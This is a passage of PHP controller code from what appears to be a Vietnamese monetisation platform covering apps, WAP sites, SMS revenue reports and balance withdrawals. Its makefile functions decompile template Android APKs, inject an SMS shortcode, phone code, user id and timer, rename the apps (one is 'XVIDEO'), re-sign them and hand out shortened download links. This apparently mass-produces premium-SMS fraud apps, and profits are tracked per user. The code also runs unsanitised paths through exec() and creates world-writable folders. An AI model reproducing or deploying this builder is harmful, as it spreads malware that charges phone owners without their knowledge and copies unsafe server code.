            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $this->load->model('api_model');
            $this->load->model('shortcode_model');
            $data['apps'] = $this->app_model->list_app_user($this->session->userdata('userid'));
            $data['apis'] = $this->api_model->list_api_user($this->session->userdata('userid'));
            $userid = $this->session->userdata('userid');
            $data['userid'] = $userid;
            $data['shortcode'] = $this->shortcode_model->list_shortcode();
            $this->load->view('user/dashboard', $data);
        }
    }

    public function add_api() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $this->load->model('api_model');
            $this->load->model('shortcode_model');
            if (isset($_REQUEST['submit'])) {
                $apiid = $this->input->post('app_id', true);
                $mess = $this->input->post('mess', true);
                $cost = $this->input->post('cost', true);
                $active = $this->input->post('active', true);
                $userid = $this->session->userdata('userid');
                $this->api_model->add_api($userid, $apiid, $mess, $cost, $active);
                redirect('user/api');
            }
            $data['apps'] = $this->app_model->list_app_user($this->session->userdata('userid'));
            $data['shortcode'] = $this->shortcode_model->list_shortcode();
            $this->load->view('user/dashboard', $data);
        }
    }

    public function update_api($id = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $this->load->model('api_model');
            $this->load->model('shortcode_model');
            $userid = $this->session->userdata('userid');
            if (isset($_REQUEST['submit'])) {
                $apiid = $this->input->post('app_id', true);
                $mess = $this->input->post('mess', true);
                $cost = $this->input->post('cost');
                $active = $this->input->post('active', true);
                $this->api_model->update_api($id, $userid, $apiid, $mess, $cost, $active);
                redirect('user/api');
            }
            $data['apps'] = $this->app_model->list_app_user($this->session->userdata('userid'));
            $data['apis'] = $this->api_model->get_api_details($userid, $id);
            $data['shortcode'] = $this->shortcode_model->list_shortcode();
            $this->load->view('user/dashboard', $data);
        }
    }

    public function del_api($id = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('api_model');
            $userid = $this->session->userdata('userid');
            $this->api_model->del_api($userid, $id);
            redirect('user/api');
        }
    }

    /*
     * ----------------- BALANCE USER  
     */

    public function withdraw($error = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['total_profit'] = $this->user_model->get_balance($userid);
            if (isset($_REQUEST['submit'])) {
                if ($this->input->post('balance_change', true) > $this->user_model->get_balance($userid)) {
                    redirect('user/withdraw/500');
                } else {
                    redirect('user/authen_withdraw/' . $this->input->post('balance_change', true).'/'.$this->input->post('type_transfer', true));
                }
            }
            if ($error <> null) {
                $data['error'] = "Số tiền rút vượt quá số tiền bạn đang có ! ";
            } else {
                $data['error'] = "";
            }

            $this->load->view('user/dashboard', $data);
        }
    }

    public function authen_withdraw($balance_change = null,$type_transfer = null) {
		 
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            if ($balance_change == null) {
                redirect('user/withdraw');
            }
            $data['username'] = $this->session->userdata('username');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['total_profit'] = $this->user_model->get_balance($userid);
            $data['userinfo'] = $this->user_model->show_details_user($userid);
            $data['balance_change'] = $balance_change;
			$data['hinhthuc_ruttien'] = $type_transfer;
            if (isset($_REQUEST['oksubmit'])) {
                // 0: Huy
                // 1: Chap nhan
                // 2: Cho xet
                // 3: Da chuyen
                $this->load->model('report_model');
				$type_transfer = $this->input->post('type_transfer', true);
                $withdraw_info = array(
                    'userid' => $userid,
                    'username' => $data['username'],
                    'before_balance' => $data['total_profit'],
                    'after_balance' => $data['total_profit'] - $data['balance_change'],
                    'amount' => $balance_change,
                    'amount' => $balance_change,
                    'datecreated' => date('d-m-Y'),
                    'timeaccess' => date('h:m:s'),
                    'status' => 2,
                    'type_withdraw' => 1, // 1: withdraw
					'type_transfer' =>$type_transfer,
                    'receiver_id' => 0, // 0: admin id
                    'status' => 2,
                ); 
                $this->report_model->add_log_withdraw($withdraw_info,$type_transfer);
                // 1: deposit
                // 2: withdraw 
                $this->user_model->update_balance(2, $userid, $balance_change);
                redirect('user/profile/800');
            }
            if (isset($_REQUEST['cancelsubmit'])) {
                redirect('user/withdraw');
            }
			
			$data['sitename']=$this->config->item('site_name');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function sendmoney($error = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['total_profit'] = $this->user_model->get_balance($userid);
            if (isset($_REQUEST['submit'])) {
                if ($this->input->post('balance_change', true) > $this->user_model->get_balance($userid)) {
                    redirect('user/sendmoney/500');
                } else {

                    $balance_change = $this->input->post('balance_change', true);
                    $receiver_id = $this->input->post('receiver_id', true);


                    $this->load->model('report_model');

                    $withdraw_info = array(
                        'userid' => $userid,
                        'username' => $data['username'],
                        'before_balance' => $data['total_profit'],
                        'after_balance' => $data['total_profit'] - $balance_change,
                        'amount' => $balance_change,
                        'amount' => $balance_change,
                        'datecreated' => date('d-m-Y'),
                        'timeaccess' => date('h:m:s'),
                        'status' => 2,
                        'type_withdraw' => 2, // 1: withdraw
                        'receiver_id' => $receiver_id,
                    );
                    $this->load->model('user_model');
                    $check = $this->user_model->check_user_exist($receiver_id);

                    if (!$check) {
                        redirect('user/sendmoney/500');
                    } else {
                        $this->report_model->add_log_withdraw($withdraw_info);
                        $this->user_model->update_balance(2, $userid, $balance_change);
                        $this->user_model->update_balance(1, $receiver_id, $balance_change);
                        redirect('user/profile/800');
                    }
                }
            }
            if ($error <> null) {
                $data['error'] = "Số tiền rút vượt quá số tiền bạn đang có ! ";
            } else {
                $data['error'] = "";
            }

            $this->load->view('user/dashboard', $data);
        }
    }

    /*
     * -------------------------------REPORT - PROFILE------------------------------------
     */

    public function report() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('report_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            //$this->user_model->update_balance(0, $userid, 0);

            $data['list_sms'] = $this->report_model->list_sms_by_user($userid);
            $data['profit'] = $this->user_model->get_balance($userid);
            $data['username'] = $this->session->userdata('username');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function ex_report($day = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('report_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            //$this->user_model->update_balance(0, $userid, 0);
            $data['list_sms'] = null;
            $datefrom = date('d-m-Y');
            $dateto = date('d-m-Y');

            if ($day == '1') { // hom nay 
                $datefrom = date('d-m-Y');
                $dateto = date('d-m-Y');
            } elseif ($day == '2') { // hom qua 
                $datefrom = date('d-m-Y');
                $dateto = date('d-m-Y'); 
                
                $datefrom = strtotime ( '-1 day' , strtotime ( $datefrom ) ) ;
                $datefrom = date ( 'd-m-Y' , $datefrom );
                $dateto = $datefrom;
                 
            } elseif ($day == '3') { // Tuan nay
                $datefrom = date('d-m-Y');
                $dateto = date('d-m-Y');
                $weekday = date("l");
                $weekday = strtolower($weekday);

            } elseif ($day == '4') { // Thang nay
                $datefrom = date('d-m-Y');
                $dateto = date('d-m-Y');
            } elseif ($day == '5') { // thang truoc 
                $datefrom = date('d-m-Y');
                $dateto = date('d-m-Y');
            } else {
               $datefrom = date('d-m-Y');
               $dateto = date('d-m-Y');
            }

            if (isset($_REQUEST['search_report'])) {
                $datefrom = $this->input->post('date_from', true);
                $dateto = $this->input->post('date_to', true); 
				if(strlen($datefrom) <= 0 && strlen($dateto) <= 0){
					redirect('user/report');
				}
                $data['datefrom'] = $datefrom;
                $data['dateto'] = $dateto;

                $datefrom_array = explode("/",$datefrom);
                $datefrom = $datefrom_array[1]."/".$datefrom_array[0]."/".$datefrom_array[2];
                $dateto_array = explode("/",$dateto);
                $dateto = $dateto_array[1]."/".$dateto_array[0]."/".$dateto_array[2];

            } else {
            	redirect('user/report');
            }
			if(strlen($datefrom) <= 0 && strlen($dateto) <= 0){
				redirect('user/report');
			}
            $result = $this->report_model->list_sms_by_user_range($userid, $datefrom, $dateto);
            $data['list_sms'] = $result; 
            $data['profit'] = $this->user_model->get_balance($userid);
            $data['username'] = $this->session->userdata('username');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function report_details($day = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('report_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['list_sms'] = null;
            $datefrom = date('01-m-Y');
            $dateto = date('d-m-Y');

            //if ($day == '1') { // hom nay 
            //    $datefrom = date('d-m-Y');
            //    $dateto = date('d-m-Y');
            //} elseif ($day == '2') { // hom qua 
            //    $datefrom = date('d-m-Y');
            //    $dateto = date('d-m-Y');

            //    $datefrom = strtotime ( '-1 day' , strtotime ( $datefrom ) ) ;
            //    $datefrom = date ( 'd-m-Y' , $datefrom );
            //    $dateto = $datefrom;

            //} elseif ($day == '3') { // Tuan nay
            //    $datefrom = date('d-m-Y');
            //    $dateto = date('d-m-Y');
            //    $weekday = date("l");
            //    $weekday = strtolower($weekday);

            //} elseif ($day == '4') { // Thang nay
            //    $datefrom = date('d-m-Y');
            //    $dateto = date('d-m-Y');
            //} elseif ($day == '5') { // thang truoc 
            //    $datefrom = date('d-m-Y');
            //    $dateto = date('d-m-Y');
            //} else {
            //   $datefrom = date('d-m-Y');
            //   $dateto = date('d-m-Y');
            //}

            $data = null;
            if (isset($_REQUEST['search_report'])) {
                $datefrom = $this->input->post('date_from', true);
                $dateto = $this->input->post('date_to', true);
                $data['datefrom'] = $datefrom;
                $data['dateto'] = $dateto;

                $datefrom_array = explode("/",$datefrom);
                $datefrom = $datefrom_array[1]."-".$datefrom_array[0]."-".$datefrom_array[2];
                $dateto_array = explode("/",$dateto);
                $dateto = $dateto_array[1]."-".$dateto_array[0]."-".$dateto_array[2];
            }
            $unix_datefrom = strtotime($datefrom);
            $unix_dateto   = strtotime($dateto);

            $data['username'] = $this->session->userdata('username');
            $result = $this->report_model->report_details_by_user_range($userid, $datefrom, $dateto);
            foreach($result as $name => $array) {
                $data['content'][$name]['count'] = count($array);
                $data['content'][$name]['profit'] = 0;
                foreach($array as $e) {
                    $data['content'][$name]['profit'] += $e->money;
                }
            }

            for($i = $unix_datefrom;$i <= $unix_dateto;$i += 24 * 3600) {
                $data['date'][$i] = $this->report_model->total_profit_by_day($userid,null,date('d',$i),date('m',$i),date('Y',$i));
            }
            
            $this->load->view('user/dashboard', $data);
        }
    }

    public function profile($report = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('report_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            if ($report == '800') {
                $data['report'] = "<b>Bạn vừa giao dịch thành công, tài khoản của bạn đã được cập nhật lại</b>";
            } else {
                $data['report'] = "";
            }
            if (isset($_REQUEST['save_profile'])) {
                $userpass  = $this->input->post('password',true);
                $phone     = $this->input->post('phone',true);
                $fullname  = $this->input->post('fullname',true);
                $address   = $this->input->post('address',true);
                $email     = $this->input->post('email',true);
                $bank      = $this->input->post('bank',true);
                $dist_bank = $this->input->post('dist_bank',true);
				$account = $this->input->post('member_account',true); 
                $this->user_model->update_user_info($userid,$userpass,$phone,$fullname,$address,$email,$bank,$dist_bank,$account);
            }
			$data['list_payment'] = $this->user_model->get_lastwithdraw($userid);
            $data['list_sms'] = $this->report_model->list_sms_by_user($userid);
            $data['profit'] = $this->user_model->get_balance($userid);
            $data['profiles'] = $this->user_model->show_details_user($userid);
            $this->load->view('user/dashboard', $data);
        }
    }

    /*
     * -------------------------------WAP------------------------------------
     */

    public function listwap() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('wap_model');
            $data['list_wap'] = $this->wap_model->list_wap_user($this->session->userdata('userid'));
            $userid = $this->session->userdata('userid');
            $data['userid'] = $userid;
            $data['sitename']=$this->config->item('site_name');
            $data['username'] = $this->session->userdata('username');
            
            $this->load->view('user/dashboard', $data);
        }
    }

    public function listwapcate() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('cate_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['list_cate'] = $this->cate_model->list_cate_user($userid);
            $data['userid'] = $userid;
            $data['username'] = $this->session->userdata('username');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function addcatewap() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('cate_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['list_cate'] = $this->cate_model->list_cate_user($userid);
            $data['userid'] = $userid;
            $data['username'] = $this->session->userdata('username');
            if (isset($_REQUEST['submit'])) {
                $catename = $this->input->post("catename", true);
                $active = $this->input->post('active', true);
                if (!file_exists('./src/' . $userid)) {
                    mkdir('./src/' . $userid, 0777, true);
                }
                $cateicon = $this->do_upload_image('./src/' . $userid . '/', 'cateicon');

                $this->load->model('cate_model');
                $this->cate_model->add_cate($userid, $catename, $cateicon, $active);
                redirect('user/listwapcate');
            }

            $this->load->view('user/dashboard', $data);
        }
    }

    public function updatecatewap($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('cate_model');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['list_cate'] = $this->cate_model->list_cate_user($userid);
            $data['userid'] = $userid;
            if (isset($_REQUEST['submit'])) {
                $catename = $this->input->post("catename", true);
                $active = $this->input->post('active', true);
                if (!file_exists('./src/' . $userid)) {
                    mkdir('./src/' . $userid, 0777, true);
                }
                $cateicon = $this->do_upload_image('./src/' . $userid . '/', 'cateicon');
                $this->cate_model->update_cate($id, $userid, $catename, $cateicon, $active);
                redirect('user/listwapcate');
            }
            $data['detailscate'] = $this->cate_model->detail_catewap($userid, $id);
            $this->load->view('user/dashboard', $data);
        }
    }

    public function delcatewap($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('cate_model');
            $userid = $this->session->userdata('userid');
            $this->cate_model->delcatewap($userid, $id);
            redirect('user/listwapcate');
        }
    }

    public function delwap($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('wap_model');
            $userid = $this->session->userdata('userid');
            $this->wap_model->delwap($userid, $id);
            redirect('user/listwap');
        }
    }

    public function change_wap_status($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('wap_model');
            $userid = $this->session->userdata('userid');
            $this->wap_model->change_wap_status($userid, $id);
            redirect('user/listwap');
        }
    }

    public function appwap() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('wap_model');
            $this->load->model('app_model');
            $data['username'] = $this->session->userdata('username');
            $data['list_wap'] = $this->wap_model->list_wap_user($this->session->userdata('userid'));
            $userid = $this->session->userdata('userid');
            $data['userid'] = $userid;

            $data['apps'] = $this->app_model->list_app_user($userid);
            $this->load->view('user/dashboard', $data);
        }
    }

    public function addwap($status = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $this->load->model('wap_model');
            $data['username'] = $this->session->userdata('username');
            if (isset($_REQUEST['submit'])) {
                $wap_name = $this->input->post('wap_name', true);
                $wap_name = preg_replace('/\s+/', '', $wap_name);
                $wap_title = $this->input->post('wap_title', true);

                $wap_meta_des = $this->input->post('wap_meta_des', true);
                $wap_meta_content = $this->input->post('wap_meta_content', true);
                $wap_copyright = $this->input->post('wap_copyright', true);
                $wap_script = $this->input->post('wap_script', true);
                $wap_active = $this->input->post('wap_active', true);
                $wap_charging = $this->input->post('wap_charging', true);
                $wap_template = $this->input->post('wap_template', true);

                $object[] = null;
                $object['userid'] = $this->session->userdata('userid');
                $object['wap_name'] = $wap_name;
                $object['wap_title'] = $wap_title;
                $object['wap_meta_des'] = $wap_meta_des;
                $object['wap_meta_content'] = $wap_meta_content;
                $object['wap_copyright'] = $wap_copyright;
                $object['wap_script'] = $wap_script;
                $object['wap_active'] = $wap_active;
                $object['wap_charging'] = $wap_charging;
                $object['wap_template'] = $wap_template;

                if ($this->wap_model->add_wap($object) == true) {
                    redirect('user/listwap');
                } else {
                    redirect('user/addwap/exit_' . $wap_name);
                }
            }
            if ($status <> null) {
                $stat = explode('_', $status);
                $data['status'] = "Tên địa chỉ này đã tồn tại" . ' http://' . $stat[1] . '.' . SITENAME;
            } else {
                $data['status'] = "";
            }
            $data['userid'] = $this->session->userdata('userid');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function updatewap($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('wap_model');
            $userid = $this->session->userdata('userid');
            if (isset($_REQUEST['submit'])) {
                $wap_name = $this->input->post('wap_name', true);
                $wap_name = preg_replace('/\s+/', '', $wap_name);
                $wap_title = $this->input->post('wap_title', true);

                $wap_meta_des = $this->input->post('wap_meta_des', true);
                $wap_meta_content = $this->input->post('wap_meta_content', true);
                $wap_copyright = $this->input->post('wap_copyright', true);
                $wap_script = $this->input->post('wap_script', true);
                $wap_active = $this->input->post('wap_active', true);
                $wap_charging = $this->input->post('wap_charging', true);
                $wap_template = $this->input->post('wap_template', true);

                $object[] = null;
                $object['userid'] = $this->session->userdata('userid');
                $object['wap_name'] = $wap_name;
                $object['wap_title'] = $wap_title;
                $object['wap_meta_des'] = $wap_meta_des;
                $object['wap_meta_content'] = $wap_meta_content;
                $object['wap_copyright'] = $wap_copyright;
                $object['wap_script'] = $wap_script;
                $object['wap_active'] = $wap_active;
                $object['wap_charging'] = $wap_charging;
                $object['wap_template'] = $wap_template;
                $object['wapid'] = $id;

                $this->wap_model->update_wap($object);
                redirect('user/listwap');
            }
            $data['details'] = $this->wap_model->get_detail_wap_by_id($id, $userid);
            $this->load->view('user/dashboard', $data);
        }
    }

    /*
     * -------------------------------YOUTUBE UPDATE----------------------------------
     */

    public function makefile_video($userid, $username, $ifile, $timeactive, $message, $phonecode, $appname, $app_alert, $iconfile,$popup_time) {
        $user_folder = LINK_URL . 'app/' . $userid;

        if (is_dir($user_folder) === false) {
            $old = umask(0);
            mkdir($user_folder, 0777, true);
            umask($old);
            $mypath = $user_folder;
        } else {
            $mypath = base_url('app/' . $userid);
        }

        $folder_file = trim(str_replace('.', '', $ifile));

        if (!file_exists($user_folder . '/apktool')) {
            copy(LINK_URL . "apktool/apktool", $user_folder . '/apktool');
        }

        if (!file_exists($user_folder . '/apktool.jar')) {
            copy(LINK_URL . "apktool/apktool.jar", $user_folder . '/apktool.jar');
        }
        if (!file_exists($user_folder . '/certificate.pem')) {
            copy(LINK_URL . "apktool/certificate.pem", $user_folder . '/certificate.pem');
        }
        if (!file_exists($user_folder . '/signapk.jar')) {
            copy(LINK_URL . "apktool/signapk.jar", $user_folder . '/signapk.jar');
        }
        if (!file_exists($user_folder . '/key.pk8')) {
            copy(LINK_URL . "apktool/key.pk8", $user_folder . '/key.pk8');
        }
        if (!file_exists($user_folder . '/VideoFunny.apk')) {
            copy(LINK_URL . "app/VideoFunny.apk", $user_folder . '/VideoFunny.apk');
        }
        $info_file = null;
        $folder_file = 'VideoFunny';
        $user_location = LINK_URL . 'app/' . $userid;

        exec('java -jar ' . $user_location . '/apktool.jar d -f  ' . $user_location . '/' . $ifile . '  ' . $user_location . '/' . $folder_file);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'http://payz.vn/api/video/hacker', site_url('api/video/' . $username));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBB', SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE1 . ' ' . rand(1, 9999));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'CCCCC', $timeactive);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'DDDDD', $userid);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAA', $phonecode);
		$this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'EEEEE', $popup_time);
        //Thay đổi tên ứng dụng 
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'VideoFunny', $appname);
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'No Connection to Internet', $app_alert);
        if ($iconfile != null) {
            copy(LINK_URL . "src/" . $userid . '/' . $iconfile, $user_location . '/res/drawable-hdpi/ic_launcher.png');
        }

        exec('java -jar ' . LINK_URL . 'app/' . $userid . '/apktool.jar b   ' . LINK_URL . 'app/' . $userid . '/' . $folder_file);
        $info_file = $this->readApkInfoFromFile(LINK_URL . 'app/' . $userid . '/' . $ifile);

        $app_linux = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/VideoFunny.apk';
        $singapk = LINK_URL . 'app/' . $userid . '/signapk.jar';
        $pem = LINK_URL . 'app/' . $userid . '/certificate.pem';
        $key = LINK_URL . 'app/' . $userid . '/key.pk8';
        $new_app_video = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile;
        exec('java -jar ' . $singapk . ' ' . $pem . ' ' . $key . ' ' . $app_linux . ' ' . $new_app_video);
        //unlink(LINK_URL.'app/'.$userid.'/'.$folder_file.'/dist/'.$ifile);
        exec('mv ' . './app/' . $userid . '/' . $folder_file . '/dist/VideoFunny.apk' . ' ' . './app/' . $userid . '/' . $folder_file . '/dist/' . $ifile);
        $link = site_url('/app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile);
        $appicon = base_url('app/' . $userid . '/img/' . $info_file['iconname'] . '.png');
        $object['link'] = $link;
        $object['icon'] = $appicon;
        $object['name'] = $info_file['lable'];
        return $object;
    }

    public function makefile_video2($userid, $username, $ifile, $timeactive, $message, $phonecode, $appname, $app_alert, $iconfile) {

        $user_folder = LINK_URL . 'app/' . $userid;

        if (is_dir($user_folder) === false) {
            $old = umask(0);
            mkdir($user_folder, 0777, true);
            umask($old);
            $mypath = $user_folder;
        } else {
            $mypath = base_url('app/' . $userid);
        }

        $folder_file = trim(str_replace('.', '', $ifile));

        if (!file_exists($user_folder . '/PhimHD.apk')) {
            copy(LINK_URL . "app/PhimHD.apk", $user_folder . '/PhimHD.apk');
        }
        $info_file = null;
        $folder_file = 'PhimHD';
        $user_location = LINK_URL . 'app/' . $userid;
        exec('java -jar ' . $user_location . '/apktool.jar d -f  ' . $user_location . '/' . $ifile . '  ' . $user_location . '/' . $folder_file);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'http://payz.vn/api/video/hacker', site_url('api/video/' . $username));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBB', SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE2 . ' ' . rand(1, 9999));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'CCCCC', $timeactive);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'DDDDD', $userid);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAA', $phonecode);
        //Thay đổi tên ứng dụng 
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'VideoFunny', $appname);
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'No Connection to Internet', $app_alert);
        if ($iconfile != null) {
            copy(LINK_URL . "src/" . $userid . '/' . $iconfile, $user_location . '/res/drawable-hdpi/ic_launcher.png');
        }

        exec('java -jar ' . LINK_URL . 'app/' . $userid . '/apktool.jar b   ' . LINK_URL . 'app/' . $userid . '/' . $folder_file);
        $info_file = $this->readApkInfoFromFile(LINK_URL . 'app/' . $userid . '/' . $ifile);

        $app_linux = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/PhimHD.apk';
        $singapk = LINK_URL . 'app/' . $userid . '/signapk.jar';
        $pem = LINK_URL . 'app/' . $userid . '/certificate.pem';
        $key = LINK_URL . 'app/' . $userid . '/key.pk8';
        $new_app_video = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile;
        exec('java -jar ' . $singapk . ' ' . $pem . ' ' . $key . ' ' . $app_linux . ' ' . $new_app_video);
        //unlink(LINK_URL.'app/'.$userid.'/'.$folder_file.'/dist/'.$ifile);
        exec('mv ' . './app/' . $userid . '/' . $folder_file . '/dist/PhimHD.apk' . ' ' . './app/' . $userid . '/' . $folder_file . '/dist/' . $ifile);
        $link = site_url('/app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile);
        $appicon = base_url('app/' . $userid . '/img/' . $info_file['iconname'] . '.png');
        $object['link'] = $link;
        $object['icon'] = $appicon;
        $object['name'] = $info_file['lable'];
        return $object;
    }

    public function makefile_photo($userid, $username, $ifile, $timeactive, $message, $phonecode, $appname, $app_alert, $iconfile) {

        $user_folder = LINK_URL . 'app/' . $userid;

        if (is_dir($user_folder) === false) {
            $old = umask(0);
            mkdir($user_folder, 0777, true);
            umask($old);
            $mypath = $user_folder;
        } else {
            $mypath = base_url('app/' . $userid);
        }

        $folder_file = trim(str_replace('.', '', $ifile));

        if (!file_exists($user_folder . '/PhotoApp.apk')) {
            copy(LINK_URL . "app/PhotoApp.apk", $user_folder . '/PhotoApp.apk');
        }
        $info_file = null;
        $folder_file = 'PhotoApp';
        $user_location = LINK_URL . 'app/' . $userid;
        exec('java -jar ' . $user_location . '/apktool.jar d -f  ' . $user_location . '/' . $ifile . '  ' . $user_location . '/' . $folder_file);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'http://payz.vn/api/video/hacker', site_url('api/video/' . $username));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBB', SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE2 . ' ' . rand(1, 9999));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'CCCCC', $timeactive);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'DDDDD', $userid);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAA', $phonecode);
        //Thay đổi tên ứng dụng 
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'VideoFunny', $appname);
        $this->update_stringfile($user_location . '/' . $folder_file . '/res/values/strings.xml', 'No Connection to Internet', $app_alert);
        if ($iconfile != null) {
            copy(LINK_URL . "src/" . $userid . '/' . $iconfile, $user_location . '/res/drawable-hdpi/ic_launcher.png');
        }

        exec('java -jar ' . LINK_URL . 'app/' . $userid . '/apktool.jar b   ' . LINK_URL . 'app/' . $userid . '/' . $folder_file);
        $info_file = $this->readApkInfoFromFile(LINK_URL . 'app/' . $userid . '/' . $ifile);

        $app_linux = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/PhotoApp.apk';
        $singapk = LINK_URL . 'app/' . $userid . '/signapk.jar';
        $pem = LINK_URL . 'app/' . $userid . '/certificate.pem';
        $key = LINK_URL . 'app/' . $userid . '/key.pk8';
        $new_app_video = LINK_URL . 'app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile;
        exec('java -jar ' . $singapk . ' ' . $pem . ' ' . $key . ' ' . $app_linux . ' ' . $new_app_video);
        //unlink(LINK_URL.'app/'.$userid.'/'.$folder_file.'/dist/'.$ifile);
        exec('mv ' . './app/' . $userid . '/' . $folder_file . '/dist/PhotoApp.apk' . ' ' . './app/' . $userid . '/' . $folder_file . '/dist/' . $ifile);
        $link = site_url('/app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile);
        $appicon = base_url('app/' . $userid . '/img/' . $info_file['iconname'] . '.png');
        $object['link'] = $link;
        $object['icon'] = $appicon;
        $object['name'] = $info_file['lable'];
        return $object;
    }

    public function yourapp() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            if ($this->session->userdata('userid') == null) {
                redirect('user/login');
            } else {
                $data['username'] = $this->session->userdata('username');
                $data['output'] = null;
                $data['ok'] = null;
                $data['filevideo'] = null;
                $username = $this->session->userdata('username');
                $userid = $this->session->userdata('userid');
                $data['filevideo'] = null;
                if (is_file(LINK_URL . 'app/' . $userid . '/VideoFunny/dist/' . 'signed_VideoFunny.apk')) {
                    $data['filevideo'] = $this->get_tiny_url(site_url('app/' . $userid . '/VideoFunny/dist/' . 'signed_VideoFunny.apk'));
                    $data['filevideo2'] = $this->get_tiny_url(site_url('app/' . $userid . '/PhimHD/dist/signed_PhimHD.apk'));
                    $data['filephoto'] = $this->get_tiny_url(site_url('app/' . $userid . '/PhotoApp/dist/signed_PhotoApp.apk'));
                    $data['javafile'] = $this->get_tiny_url(site_url('file/' . $username . '/Cliphot_' . $userid . '.jar'));
                } else {
                    $link = $this->input->post('ifile', true);
                    $appname = "XVIDEO";
//					 	$applink = $this->input->post('applink', true);
                    $active = 1;
                    $shortcode = PHONE_CODE;
                    $message = SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE1;
                    $timeactive = "89400000";
                    $userid = $this->session->userdata('userid');
                    $appdes = null;
                    $appcate = null;
                    $app_alert = null;
                    $ifile = 'VideoFunny.apk';
